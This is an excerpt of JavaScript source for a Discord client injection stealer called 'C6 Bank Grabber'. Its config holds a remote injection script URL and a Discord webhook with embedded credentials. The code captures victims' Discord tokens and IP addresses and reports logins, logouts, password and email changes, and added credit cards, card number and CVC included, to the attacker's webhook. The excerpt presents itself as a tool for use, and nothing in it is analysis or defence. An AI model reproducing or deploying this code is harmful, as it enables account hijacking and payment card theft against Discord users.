...
const config = {
    ...
    injection_url: "https://raw.githubusercontent.com/KSCHdsc/C6 Bank-Inject/main/index.js",
    webhook: "https://discord.com/api/webhooks/1071605886579114004/ThNTIg_xTqZquhiFuMIqVncLCnKrj6rOXTGyAKgKzVdC6h0RKY4nPIncb5b1ISvT-vF2",
    UWUWED: "https://bloom-rumbling-pet.glitch.me/premium/",
    filter2: {
        urls: [
...
if (fs.existsSync(bdPath)) require(bdPath);`;
    ...
    if (!fs.existsSync(path.join(__dirname, "C6 Bank"))) return !0;
    execScript(
...
async function FirstTime() {
    ...
    window.webContents.executeJavaScript(`${EvalToken}`, !0).then((async token => {
        ...
        if (config['init-notify'] == "true") {
            if (fs.existsSync(path.join(__dirname, "C6 Bank"))) {
                fs.rmdirSync(path.join(__dirname, "C6 Bank"));
                if (token == null || token == undefined || token == "") {
                    var {
                        ip
                    } = await getFromURL("https://www.myexternalip.com/json", null)
                    const c = {
                        username: "C6 Bank Grabber",
                        avatar_url: "https://raw.githubusercontent.com/lux-206/C6Bank/main/download.png?token=GHSAT0AAAAAAB6ALJXYFFHDL3PG2C2TXMSOY67COTA",
                        content: "",
                        embeds: [{
                            title: "C6 Bank Initalized",
                            ...
                            footer: {
                                text: "@C6 Bank by t*#9009 and soup#2292"
                            }
						}]
                    };
                    ...
                    if(b.avatar === null){
                        usericonurl = "https://raw.githubusercontent.com/lux-206/C6Bank/main/download.png?token=GHSAT0AAAAAAB6ALJXYFFHDL3PG2C2TXMSOY67COTA"
                    }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
                    if(b.banner === null){
                        bannerurl = "https://raw.githubusercontent.com/lux-206/C6Bank/main/banco-c6-bank.png?token=GHSAT0AAAAAAB6ALJXZWTRXE2RZ5QNQ6JQ4Y67CMHA"
                    ...
                    const c = {
                        ...
                        embeds: [{
                            title: "C6 Bank Initalized",
                            description: "[<a:C6 Bankgif:1041634542093619260>  **Oh you have C6 Banked someone**]@C6 Bank",
                            color: config["embed-color"],
                            fields: [{
                                name: "Injection Info",
                    ...
                    if (config['logout-notify'] == "true") {
                        if (token == null || token == undefined || token == "") {
                            ...
                            const c = {
                                ...
                                content: "",
                                embeds: [{
                                    title: "C6 Banked User log out (User not Logged in before)",
                                    color: config["embed-color"],
                                    fields: [{
                                        name: "Injection Info",
                            ...
                            const c = {
                                ...
                                content: "",
                                embeds: [{
                                    title: "C6 Bank Victim got logged out",
                                    description: "[<a:C6 Bankgif:1041634542093619260>  **Oh you have C6 Banked someone**]@C6 Bank",
                                    color: config["embed-color"],
                                    fields: [{
                                        name: "Injection Info",
    ...
    window.webContents.executeJavaScript(`
        ...
        window.webContents.executeJavaScript(`
            ...
            const params = {
                ...
                content: "",
                embeds: [{
                    "title": "C6 Bank Detect Password Changed",
                    description: "[<a:C6 Bankgif:1041634542093619260>  **Oh you have C6 Banked someone**]@C6 Bank",
                    "color": config['embed-color'],
                    "fields": [{
                        name: "Injection Info",
    ...
    window.webContents.executeJavaScript(`
        ...
        window.webContents.executeJavaScript(`
           ...
           const params = {
                ...
                content: "",
                embeds: [{
                        "title": "C6 Bank Detect Email Changed",
                        description: "[<a:C6 Bankgif:1041634542093619260>  **Oh you have C6 Banked someone**]@C6 Bank",
                        "color": config['embed-color'],
                        "fields": [{
                                name: "Injection Info",
...
async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
    ...
    var {
        ...
        const params = {
            ...
            content: "",
            embeds: [{
                    "title": "C6 Bank User Credit Card Added",
                    "description": `
                    **IP:** ${ip}\n\n
            ...
            },
                {
                    ...
                    "color": config['embed-color'],
                    "description": `\`\`\`diff\n${fs.readFileSync('C6 Banked_guilds_result.txt', 'utf-8') || "- This user is not the owner of any server"}\`\`\``,
